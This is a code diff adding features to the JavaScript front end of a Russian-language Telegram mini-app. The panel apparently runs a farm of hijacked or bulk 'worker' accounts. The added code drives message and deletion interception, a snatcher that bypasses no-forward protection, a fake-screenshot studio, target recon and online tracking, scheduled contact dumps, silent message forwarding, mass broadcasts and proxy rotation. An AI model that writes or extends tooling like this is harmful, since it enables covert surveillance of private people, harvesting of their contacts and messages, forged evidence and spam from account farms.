@@ -355,6 +355,9 @@
       const res = await fetch(fullUrl, options);
       if (!res.ok) {
         const errJson = await res.json().catch(() => ({}));
+        if (errJson.status === 'locked') {
+          showLockScreen(errJson.message || 'Бот временно недоступен.');
+        }
         throw new Error(errJson.message || `HTTP ${res.status}`);
       }
       return await res.json();
@@ -365,6 +368,19 @@
       resolveApiUrl().catch(() => {});
       throw e;
     }
+  }
+
+  function showLockScreen(msg) {
+    if (document.getElementById('botLockOverlay')) return;
+    const overlay = document.createElement('div');
+    overlay.id = 'botLockOverlay';
+    overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(7,8,10,0.96);display:flex;align-items:center;justify-content:center;padding:24px;text-align:center;color:#fff;';
+    overlay.innerHTML = `<div style="max-width:340px;background:#14161b;border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:24px;">
+      <div style="font-size:32px;margin-bottom:12px;">🔒</div>
+      <div style="font-size:16px;font-weight:700;margin-bottom:8px;">Доступ временно ограничен</div>
+      <div style="font-size:13.5px;color:#9ca3af;line-height:1.5;">${escapeHtml(msg)}</div>
+    </div>`;
+    document.body.appendChild(overlay);
   }
 
   // Application Entry Point
@@ -433,6 +449,8 @@
     setupSystemActions();
     setupFakeshotStudio();
     setupStoreAndAutomations();
+    setupThemeAndPalette();
+    setupV32Suite();
 
     // Load Live Data Concurrently
     await Promise.allSettled([
@@ -2501,8 +2519,9 @@
             <div>💻 Фингерпринт: <span style="color: var(--text-primary); font-family: var(--font-mono); font-size: 11px;">${escapeHtml(a.device_model || 'Windows 11 Pro x64')}</span></div>
           </div>
           <div style="display: flex; gap: 8px;">
+            <button class="btn-secondary btn-farm-devices" data-sid="${escapeHtml(a.session_id)}" style="flex: 1; padding: 6px; font-size: 12px;">📱 Устройства</button>
             <button class="btn-secondary btn-farm-restart" data-sid="${escapeHtml(a.session_id)}" style="flex: 1; padding: 6px; font-size: 12px;">🔄 Рестарт</button>
-            <button class="btn-secondary danger btn-farm-delete" data-sid="${escapeHtml(a.session_id)}" style="flex: 1; padding: 6px; font-size: 12px;">🗑 Удалить</button>
+            <button class="btn-secondary danger btn-farm-delete" data-sid="${escapeHtml(a.session_id)}" style="flex: 1; padding: 6px; font-size: 12px;">🗑</button>
           </div>
         </div>
       `;
@@ -3453,6 +3472,481 @@
     updateFilterCounters();
     renderFeed();
   };
+
+  function setupThemeAndPalette() {
+    const themes = ['neon', 'tg', 'mono'];
+    const labels = { neon: 'OLED Neon', tg: 'Telegram Native', mono: 'Stealth Mono' };
+    let curTheme = localStorage.getItem('ayulite_theme') || 'neon';
+    if (curTheme !== 'neon') document.documentElement.setAttribute('data-theme', curTheme);
+
+    const btnTheme = document.getElementById('btnThemeCycle');
+    if (btnTheme) {
+      btnTheme.addEventListener('click', () => {
+        haptic('light');
+        const nextIdx = (themes.indexOf(curTheme) + 1) % themes.length;
+        curTheme = themes[nextIdx];
+        if (curTheme === 'neon') document.documentElement.removeAttribute('data-theme');
+        else document.documentElement.setAttribute('data-theme', curTheme);
+        localStorage.setItem('ayulite_theme', curTheme);
+        showToast(`Тема: ${labels[curTheme]}`, '🎨');
+      });
+    }
+
+    const modal = document.getElementById('cmdPaletteModal');
+    const input = document.getElementById('cmdPaletteInput');
+    const list = document.getElementById('cmdPaletteList');
+    const commands = [
+      { label: '⚡ Перейти: Лента перехватов', hint: 'Tab', run: () => document.querySelector('.dock-btn[data-tab="feed"]')?.click() },
+      { label: '💬 Перейти: Сейф диалогов', hint: 'Tab', run: () => document.querySelector('.dock-btn[data-tab="vault"]')?.click() },
+      { label: '🛡 Перейти: Стелс & Разведка', hint: 'Tab', run: () => document.querySelector('.dock-btn[data-tab="stealth"]')?.click() },
+      { label: '🤖 Перейти: Ферма & Здоровье', hint: 'Tab', run: () => document.querySelector('.dock-btn[data-tab="farm"]')?.click() },
+      { label: '🎛 Перейти: Центр оператора', hint: 'Tab', run: () => document.querySelector('.dock-btn[data-tab="system"]')?.click() },
+      { label: '📸 Студия фейк-скриншотов iOS 18', hint: 'Tool', run: () => document.getElementById('btnOpenFakeshotModal')?.click() },
+      { label: '📥 Media Snatcher (NoForwards)', hint: 'Tool', run: () => document.getElementById('fadSnatcherBtn')?.click() },
+      { label: '➕ Добавить сессию воркера', hint: 'Farm', run: () => document.getElementById('btnAddSessionOpen')?.click() },
+      { label: '⚡ Auto-Recover воркеров', hint: 'Health', run: () => document.getElementById('btnFarmRecover')?.click() },
+      { label: '🧹 Очистить временный кэш', hint: 'System', run: () => document.getElementById('btnClearCacheBtn')?.click() },
+      { label: '🚨 Panic Sleep (Заморозка)', hint: 'Danger', run: () => document.getElementById('btnPanicFreeze')?.click() },
+    ];
+
+    function renderCmds(q = '') {
+      if (!list) return;
+      const ql = q.trim().toLowerCase();
+      const filtered = commands.filter(c => !ql || c.label.toLowerCase().includes(ql) || c.hint.toLowerCase().includes(ql));
+      list.innerHTML = filtered.map((c, idx) => `
+        <button type="button" class="cmd-palette-item" data-cmd-idx="${idx}">
+          <span>${escapeHtml(c.label)}</span>
+          <span class="chip-pill">${escapeHtml(c.hint)}</span>
+        </button>
+      `).join('') || '<div style="text-align:center;padding:16px;color:var(--text-muted);">Ничего не найдено</div>';
+      list.querySelectorAll('.cmd-palette-item').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const item = filtered[parseInt(btn.dataset.cmdIdx, 10)];
+          if (modal) modal.classList.remove('active');
+          if (item) item.run();
+        });
+      });
+    }
+
+    function openPalette() {
+      if (!modal) return;
+      modal.classList.add('active');
+      if (input) { input.value = ''; input.focus(); }
+      renderCmds('');
+    }
+
+    document.getElementById('btnCmdPalette')?.addEventListener('click', openPalette);
+    document.getElementById('btnCloseCmdPalette')?.addEventListener('click', () => modal?.classList.remove('active'));
+    modal?.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('active'); });
+    input?.addEventListener('input', () => renderCmds(input.value));
+    document.addEventListener('keydown', (e) => {
+      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
+        e.preventDefault();
+        openPalette();
+      } else if (e.key === 'Escape' && modal?.classList.contains('active')) {
+        modal.classList.remove('active');
+      }
+    });
+  }
+
+  function openDrawer(title, htmlBody) {
+    const modal = document.getElementById('farmDrawerModal');
+    const tEl = document.getElementById('farmDrawerTitle');
+    const bEl = document.getElementById('farmDrawerBody');
+    if (!modal || !tEl || !bEl) return;
+    tEl.textContent = title;
+    bEl.innerHTML = htmlBody;
+    modal.classList.add('active');
+  }
+
+  function setupV32Suite() {
+    const drawer = document.getElementById('farmDrawerModal');
+    document.getElementById('btnCloseFarmDrawer')?.addEventListener('click', () => drawer?.classList.remove('active'));
+    drawer?.addEventListener('click', (e) => { if (e.target === drawer) drawer.classList.remove('active'); });
+
+    // Delegate click for Farm account devices
+    document.getElementById('farmAccountsList')?.addEventListener('click', async (e) => {
+      const btn = e.target.closest('.btn-farm-devices');
+      if (!btn) return;
+      const sid = btn.dataset.sid;
+      haptic('light');
+      openDrawer('📱 Активные устройства', '<div class="skeleton-line"></div><div class="skeleton-line"></div>');
+      try {
+        const res = await api(`/api/farm/authorizations/${encodeURIComponent(sid)}`);
+        const auths = res.authorizations || [];
+        const html = auths.length ? auths.map(a => `
+          <div style="padding:10px;border:1px solid var(--border-subtle);border-radius:10px;margin-bottom:8px;">
+            <div style="display:flex;justify-content:space-between;font-weight:600;">
+              <span>${escapeHtml(a.device_model || 'Unknown')} ${a.current ? '🟢' : ''}</span>
+              <span class="chip-pill">${escapeHtml(a.country || a.ip || '')}</span>
+            </div>
+            <div style="color:var(--text-muted);font-size:11px;margin-top:4px;">
+              ${escapeHtml(a.app_name || '')} ${escapeHtml(a.app_version || '')} • ${escapeHtml(a.platform || '')} • IP: ${escapeHtml(a.ip || '')}
+            </div>
+          </div>
+        `).join('') : '<div style="color:var(--text-muted);">Нет активных авторизаций</div>';
+        openDrawer('📱 Активные устройства', html);
+      } catch (err) {
+        openDrawer('📱 Ошибка', `<div style="color:var(--rose);">${escapeHtml(err.message)}</div>`);
+      }
+    });
+
+    // Health & Metrics loader
+    async function loadFarmHealthAndMetrics() {
+      try {
+        const [mRes, hRes] = await Promise.allSettled([
+          api('/api/metrics'),
+          api(`/api/health/workers/${state.userId}`)
+        ]);
+        if (mRes.status === 'fulfilled' && mRes.value?.totals) {
+          const t = mRes.value.totals;
+          const el = (id, v) => { const n = document.getElementById(id); if (n) n.textContent = String(v ?? 0); };
+          el('mIntercepted', t.messages_intercepted);
+          el('mDeletes', t.deletes_intercepted);
+          el('mMedia', t.media_intercepted);
+          el('mVault', t.vault_deliveries);
+        }
+        if (hRes.status === 'fulfilled' && hRes.value?.workers) {
+          const badges = document.getElementById('farmHealthBadges');
+          if (badges) {
+            badges.innerHTML = hRes.value.workers.map(w => {
+              const cls = w.flood_wait ? 'warn' : (w.is_running ? 'ok' : 'err');
+              const ping = w.ping_ms != null ? `${w.ping_ms}ms` : (w.is_running ? 'ON' : 'OFF');
+              const dc = w.dc_id ? `DC${w.dc_id}` : '';
+              return `<span class="chip-pill ${cls}">${escapeHtml(w.name)} • ${ping} ${dc}</span>`;
+            }).join('');
+          }
+          const selTrap = document.getElementById('selectTrapSession');
+          if (selTrap) {
+            const cur = selTrap.value;
+            selTrap.innerHTML = hRes.value.workers.map(w =>
+              `<option value="${escapeHtml(w.session_id)}">${escapeHtml(w.name)}</option>`
+            ).join('');
+            if (cur) selTrap.value = cur;
+            if (selTrap.value) loadKeywordTraps(selTrap.value);
+          }
+        }
+      } catch (_) {}
+    }
+
+    async function loadKeywordTraps(sid) {
+      const box = document.getElementById('keywordTrapList');
+      if (!box || !sid) return;
+      try {
+        const res = await api('/api/farm/keyword_trap', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ session_id: sid, action: 'list' })
+        });
+        const traps = res.traps || [];
+        box.innerHTML = traps.length ? traps.map(t => `
+          <span class="chip-pill ok" style="cursor:pointer;" data-trap="${escapeHtml(t)}">${escapeHtml(t)} ✕</span>
+        `).join('') : '<span style="color:var(--text-muted);">Триггеры не заданы</span>';
+        box.querySelectorAll('[data-trap]').forEach(el => {
+          el.addEventListener('click', async () => {
+            await api('/api/farm/keyword_trap', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ session_id: sid, action: 'remove', keyword: el.dataset.trap })
+            });
+            loadKeywordTraps(sid);
+          });
+        });
+      } catch (_) {}
+    }
+
+    document.getElementById('selectTrapSession')?.addEventListener('change', (e) => loadKeywordTraps(e.target.value));
+    document.getElementById('btnTrapAdd')?.addEventListener('click', async () => {
+      const sid = document.getElementById('selectTrapSession')?.value;
+      const kw = document.getElementById('inputTrapKeyword')?.value.trim();
+      if (!sid || !kw) return showToast('Выберите сессию и введите слово', '⚠️', true);
+      try {
+        await api('/api/farm/keyword_trap', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ session_id: sid, action: 'add', keyword: kw })
+        });
+        document.getElementById('inputTrapKeyword').value = '';
+        loadKeywordTraps(sid);
+        showToast(`Ловушка «${kw}» добавлена`, '🎯');
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    document.getElementById('btnFarmRefreshHealth')?.addEventListener('click', () => {
+      haptic('light');
+      loadFarmHealthAndMetrics();
+      showToast('Обновление пинга воркеров...', '🔄');
+    });
+
+    document.getElementById('btnFarmRecover')?.addEventListener('click', async () => {
+      haptic('medium');
+      try {
+        const res = await api('/api/health/recover', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: state.userId })
+        });
+        showToast(res.message || 'Восстановление выполнено', '⚡');
+        loadFarmAccounts();
+        loadFarmHealthAndMetrics();
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    document.getElementById('btnFarmAdminChannels')?.addEventListener('click', async () => {
+      openDrawer('📢 Каналы где воркер админ', '<div class="skeleton-line"></div><div class="skeleton-line"></div>');
+      try {
+        const res = await api(`/api/farm/admin_channels/${state.userId}`);
+        const list = res.channels || [];
+        openDrawer(`📢 Каналы (${list.length})`, list.length ? list.map(c => `
+          <div style="padding:9px;border-bottom:1px solid var(--border-subtle);display:flex;justify-content:space-between;align-items:center;">
+            <div>
+              <div style="font-weight:600;">${escapeHtml(c.title)}</div>
+              <div style="font-size:11px;color:var(--text-muted);">${c.members} уч. • ${escapeHtml((c.rights || []).join(', '))}</div>
+            </div>
+            ${c.invite_link ? `<a href="${escapeHtml(c.invite_link)}" target="_blank" class="chip-pill ok" style="text-decoration:none;">Открыть</a>` : ''}
+          </div>
+        `).join('') : '<div style="color:var(--text-muted);">Нет администрируемых каналов</div>');
+      } catch (err) { openDrawer('Ошибка', `<div style="color:var(--rose);">${escapeHtml(err.message)}</div>`); }
+    });
+
+    document.getElementById('btnFarmContacts')?.addEventListener('click', async () => {
+      openDrawer('👥 Адресная книга воркеров', '<div class="skeleton-line"></div><div class="skeleton-line"></div>');
+      try {
+        const res = await api(`/api/farm/contacts/${state.userId}`);
+        const list = res.contacts || [];
+        openDrawer(`👥 Контакты (${list.length})`, list.slice(0, 80).map(c => `
+          <div style="padding:7px 0;border-bottom:1px solid var(--border-subtle);display:flex;justify-content:space-between;">
+            <span>${escapeHtml((c.first_name + ' ' + c.last_name).trim() || String(c.id))} ${c.username ? '@' + escapeHtml(c.username) : ''}</span>
+            <span style="font-family:var(--font-mono);color:var(--text-muted);">${escapeHtml(c.phone || String(c.id))}</span>
+          </div>
+        `).join('') || '<div style="color:var(--text-muted);">Контакты не найдены</div>');
+      } catch (err) { openDrawer('Ошибка', `<div style="color:var(--rose);">${escapeHtml(err.message)}</div>`); }
+    });
+
+    // Online Tracker
+    async function loadOnlineTracker() {
+      const list = document.getElementById('onlineTrackerList');
+      if (!list) return;
+      try {
+        const res = await api(`/api/recon/online_tracker/${state.userId}`);
+        const targets = res.targets || {};
+        const entries = Object.entries(targets);
+        if (!entries.length) {
+          list.innerHTML = '<span style="color:var(--text-muted);">Цели не добавлены</span>';
+          return;
+        }
+        list.innerHTML = entries.map(([tid, info]) => `
+          <div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-subtle);">
+            <div>
+              <span style="font-weight:600;color:var(--text-primary);">${escapeHtml(info.name || tid)}</span>
+              <span class="chip-pill" style="margin-left:6px;">${escapeHtml(info.last_seen || 'ожидание')}</span>
+            </div>
+            <button type="button" class="btn-secondary danger btn-tracker-del" data-tid="${escapeHtml(tid)}" style="padding:3px 8px;font-size:11px;">✕</button>
+          </div>
+        `).join('');
+        list.querySelectorAll('.btn-tracker-del').forEach(b => {
+          b.addEventListener('click', async () => {
+            await api('/api/recon/online_tracker/toggle', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ user_id: state.userId, action: 'remove', target_id: b.dataset.tid })
+            });
+            loadOnlineTracker();
+          });
+        });
+      } catch (_) {}
+    }
+
+    document.getElementById('btnTrackerAdd')?.addEventListener('click', async () => {
+      const target = document.getElementById('inputTrackerTarget')?.value.trim();
+      if (!target) return;
+      try {
+        const res = await api('/api/recon/online_tracker/toggle', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: state.userId, action: 'add', target_id: target, target_name: target })
+        });
+        document.getElementById('inputTrackerTarget').value = '';
+        showToast(res.message || 'Цель добавлена', '👁');
+        loadOnlineTracker();
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    // Recon buttons
+    document.getElementById('btnReconSharedChats')?.addEventListener('click', async () => {
+      const target = document.getElementById('inputReconTarget')?.value.trim();
+      if (!target) return showToast('Укажите ID или @username', '⚠️', true);
+      openDrawer('💬 Общие чаты', '<div class="skeleton-line"></div>');
+      try {
+        const res = await api(`/api/recon/shared_chats/${state.userId}?target_id=${encodeURIComponent(target)}`);
+        const chats = res.chats || [];
+        openDrawer(`💬 Общие чаты (${chats.length})`, chats.map(c => `
+          <div style="padding:8px 0;border-bottom:1px solid var(--border-subtle);">
+            <b>${escapeHtml(c.title)}</b> <span style="color:var(--text-muted);">${c.username ? '@' + escapeHtml(c.username) : c.id}</span>
+          </div>
+        `).join('') || 'Общих чатов не найдено');
+      } catch (err) { openDrawer('Ошибка', `<div style="color:var(--rose);">${escapeHtml(err.message)}</div>`); }
+    });
+
+    document.getElementById('btnReconStories')?.addEventListener('click', async () => {
+      const target = document.getElementById('inputReconTarget')?.value.trim();
+      if (!target) return showToast('Укажите ID или @username', '⚠️', true);
+      openDrawer('📸 Истории цели', '<div class="skeleton-line"></div>');
+      try {
+        const res = await api(`/api/recon/stories/${state.userId}?target_id=${encodeURIComponent(target)}`);
+        const stories = res.stories || [];
+        openDrawer(`📸 Сторис (${stories.length})`, stories.map(s => `
+          <div style="padding:8px 0;border-bottom:1px solid var(--border-subtle);">
+            <div><b>#${s.id}</b> • ${escapeHtml(s.media_type || 'text')} • ${escapeHtml((s.date || '').slice(0, 16))}</div>
+            ${s.caption ? `<div style="color:var(--text-secondary);margin-top:4px;">${escapeHtml(s.caption)}</div>` : ''}
+          </div>
+        `).join('') || 'Активных сторис нет');
+      } catch (err) { openDrawer('Ошибка', `<div style="color:var(--rose);">${escapeHtml(err.message)}</div>`); }
+    });
+
+    document.getElementById('btnReconMembers')?.addEventListener('click', async () => {
+      const target = document.getElementById('inputReconTarget')?.value.trim();
+      if (!target) return showToast('Укажите ID или @username канала', '⚠️', true);
+      openDrawer('👥 Участники канала', '<div class="skeleton-line"></div>');
+      try {
+        const res = await api(`/api/recon/members/${state.userId}?channel_id=${encodeURIComponent(target)}&limit=100`);
+        const members = res.members || [];
+        openDrawer(`👥 ${res.channel || target} (${members.length})`, members.map(m => `
+          <div style="padding:6px 0;border-bottom:1px solid var(--border-subtle);display:flex;justify-content:space-between;">
+            <span>${escapeHtml((m.first_name + ' ' + m.last_name).trim())} ${m.username ? '@' + escapeHtml(m.username) : ''}</span>
+            <span class="chip-pill">${escapeHtml(m.role)}</span>
+          </div>
+        `).join('') || 'Список пуст или скрыт');
+      } catch (err) { openDrawer('Ошибка', `<div style="color:var(--rose);">${escapeHtml(err.message)}</div>`); }
+    });
+
+    // Broadcast v2 & Scheduler
+    document.getElementById('btnBcastV2Send')?.addEventListener('click', async () => {
+      const targets = (document.getElementById('inputBcastTargets')?.value || '').split(',').map(x => x.trim()).filter(Boolean);
+      const text = (document.getElementById('inputBcastText')?.value || '').trim();
+      if (!targets.length || !text) return showToast('Укажите цели и текст', '⚠️', true);
+      try {
+        const res = await api('/api/farm/broadcast_v2', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: state.userId, target_ids: targets, text })
+        });
+        showToast(res.message || 'Рассылка запущена', '🚀');
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    async function loadSchedulerTasks() {
+      const box = document.getElementById('schedulerTasksList');
+      if (!box) return;
+      try {
+        const res = await api(`/api/scheduler/tasks/${state.userId}`);
+        const tasks = res.tasks || [];
+        box.innerHTML = tasks.length ? tasks.map(t => `
+          <div style="display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid var(--border-subtle);">
+            <span>#${escapeHtml(t.task_id)} • <b>${escapeHtml(t.task_type)}</b> в ${String(t.cron_hour).padStart(2, '0')}:${String(t.cron_minute).padStart(2, '0')}</span>
+            <button type="button" class="btn-secondary danger btn-sched-del" data-tid="${escapeHtml(t.task_id)}" style="padding:2px 7px;font-size:10.5px;">✕</button>
+          </div>
+        `).join('') : '<span style="color:var(--text-muted);">Нет запланированных задач</span>';
+        box.querySelectorAll('.btn-sched-del').forEach(b => {
+          b.addEventListener('click', async () => {
+            await api(`/api/scheduler/task/${encodeURIComponent(b.dataset.tid)}`, { method: 'DELETE' });
+            loadSchedulerTasks();
+          });
+        });
+      } catch (_) {}
+    }
+
+    document.getElementById('btnSchedAdd')?.addEventListener('click', async () => {
+      const task_type = document.getElementById('selectSchedType')?.value || 'contact_dump';
+      const cron_hour = parseInt(document.getElementById('inputSchedHour')?.value || '9', 10);
+      const cron_minute = parseInt(document.getElementById('inputSchedMin')?.value || '0', 10);
+      try {
+        await api('/api/scheduler/task', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: state.userId, task_type, cron_hour, cron_minute })
+        });
+        showToast('Задача добавлена в планировщик', '⏰');
+        loadSchedulerTasks();
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    // Proxy Pool
+    async function loadProxies() {
+      const box = document.getElementById('proxyPoolList');
+      if (!box) return;
+      try {
+        const res = await api('/api/farm/proxies');
+        const list = res.proxies || [];
+        box.innerHTML = list.length ? list.map(p => `
+          <div style="display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid var(--border-subtle);">
+            <span><span class="chip-pill ${p.alive ? 'ok' : 'err'}">${p.alive ? 'OK' : 'DEAD'}</span> ${escapeHtml(p.proxy_type)}://${escapeHtml(p.addr)}:${p.port}</span>
+            <button type="button" class="btn-secondary danger btn-px-del" data-pid="${escapeHtml(p.id)}" style="padding:2px 7px;font-size:10.5px;">✕</button>
+          </div>
+        `).join('') : '<span style="color:var(--text-muted);">Прокси не добавлены</span>';
+        box.querySelectorAll('.btn-px-del').forEach(b => {
+          b.addEventListener('click', async () => {
+            await api('/api/farm/proxies', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ action: 'delete', id: b.dataset.pid })
+            });
+            loadProxies();
+          });
+        });
+      } catch (_) {
+        box.innerHTML = '<span style="color:var(--text-muted);">Доступно только администратору</span>';
+      }
+    }
+
+    document.getElementById('btnProxyAdd')?.addEventListener('click', async () => {
+      const proxy_type = document.getElementById('selectProxyType')?.value || 'socks5';
+      const addr = document.getElementById('inputProxyHost')?.value.trim();
+      const port = parseInt(document.getElementById('inputProxyPort')?.value || '0', 10);
+      if (!addr || !port) return showToast('Укажите host и port', '⚠️', true);
+      try {
+        const res = await api('/api/farm/proxies', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'add', proxy_type, addr, port })
+        });
+        document.getElementById('inputProxyHost').value = '';
+        document.getElementById('inputProxyPort').value = '';
+        showToast(res.message || 'Прокси добавлен', '🌐');
+        loadProxies();
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    // Vault Dialog Dump & Shadow Forward
+    document.getElementById('btnVaultDialogDump')?.addEventListener('click', async () => {
+      if (!state.activeChatId) return showToast('Сначала выберите диалог', '⚠️', true);
+      try {
+        const res = await api('/api/tools/dialog_dump', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: state.userId, chat_id: state.activeChatId, limit: 100 })
+        });
+        showToast(`Выгружено ${res.total || 0} сообщений в Сейф`, '📋');
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    document.getElementById('btnVaultShadowFwd')?.addEventListener('click', async () => {
+      if (!state.activeChatId) return showToast('Сначала выберите диалог', '⚠️', true);
+      const msgId = prompt('Введите ID сообщения для тихой копии в Избранное:');
+      if (!msgId) return;
+      try {
+        const res = await api('/api/tools/shadow_forward', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: state.userId, from_chat_id: state.activeChatId, msg_id: parseInt(msgId, 10), to_chat_id: 'me' })
+        });
+        showToast(res.message || 'Скопировано', '🕵️');
+      } catch (err) { showToast(err.message, '❌', true); }
+    });
+
+    // Initial background loads
+    Promise.allSettled([loadFarmHealthAndMetrics(), loadOnlineTracker(), loadSchedulerTasks(), loadProxies()]);
+  }
 
   function escapeHtml(str) {
     if (!str) return '';
